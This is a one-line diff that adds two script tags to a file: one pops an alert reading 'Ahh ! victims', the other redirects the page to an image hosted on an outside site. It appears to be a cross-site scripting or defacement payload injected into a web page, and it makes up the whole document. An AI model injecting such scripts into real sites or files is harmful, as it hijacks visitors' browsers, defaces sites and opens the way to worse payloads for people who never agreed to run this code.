@@ -1,0 +1,1 @@
+<script>alert('Ahh ! victims')</script><script>window.location.href=('https://i.pinimg.com/originals/9a/95/cd/9a95cd79f1dccf18784a905c9d272b60.jpg');</script>
